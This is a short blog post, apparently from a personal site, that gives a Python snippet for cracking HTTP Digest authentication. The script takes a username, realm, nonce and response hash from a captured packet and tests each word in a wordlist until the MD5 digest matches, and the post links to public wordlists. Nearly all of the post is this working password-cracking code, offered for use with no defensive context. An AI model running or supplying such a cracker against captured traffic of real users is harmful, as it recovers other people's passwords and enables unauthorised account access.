---
title: "HTTP Authentication Dictionary Attack"
published: 2018-05-21T07:59:00+12:00

tags: [ "security", "python", "snippet", "networking",]
---

Here's a little snippet of Python code to crack HTTP digest authentication, getting a user's password given information from a captured packet and a wordlist.

```py
import hashlib

extracted = 'known_auth_hash'
nonce = 'known_nonce_hash'

user = 'known_username'
realm = 'known_realm'
uri = '/image.png'
method = 'GET'

with open('words.txt', 'r') as file:
  for line in file:
    line = line.strip()

    ha1 = hashlib.md5((user+':'+realm+':'+line).encode('utf-8')).hexdigest()
    ha2 = hashlib.md5((method+':'+uri).encode('utf-8')).hexdigest()
    response = hashlib.md5((ha1+':'+nonce+':'+ha2).encode('utf-8')).hexdigest()

    if response == extracted:
      print('success! word was:', line)
      break
```

You can find some good wordlists [right here](https://github.com/danielmiessler/SecLists).
